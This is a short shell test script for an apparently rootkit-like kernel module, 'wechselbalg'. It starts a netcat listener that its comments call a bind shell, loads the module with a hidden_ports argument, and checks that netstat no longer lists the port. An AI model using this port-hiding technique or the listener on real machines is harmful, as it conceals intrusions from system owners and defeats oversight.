#!/bin/sh

error=0

#echo "[+] checking netstat functionality (requires netcat)"

if [ $(ps x | grep ' nc ' | wc -l) != 1 ]; then
	echo "error: no other nc instanced should be running"
	exit
fi


#echo "creating netcat bind shell"
nc -lvp 23451 > /dev/null&


#echo "checking if it's visible in netstat"
if [ $(netstat -tunl | grep 23451 | wc -l) != "1" ]; then
	echo "error: netcat bind shell failed"
	error=1
fi


#echo "loading wechselbalg"
sudo insmod ../bin/wechselbalg.ko hidden_ports=23451


#echo "checking if it's still visible in netstat"
if [ $(netstat -tunl | grep 23451 | wc -l) != "0" ]; then
	echo "error: netcat bind shell still visible"
	error=1
fi




#echo "unloading wechselbalg"
sudo rmmod wechselbalg

#echo "killing netcat"
killall nc

if [ "$error" -eq 1 ]; then
	echo "[netstat hiding] failed"
else 
	echo "[netstat hiding] successfull"
fi
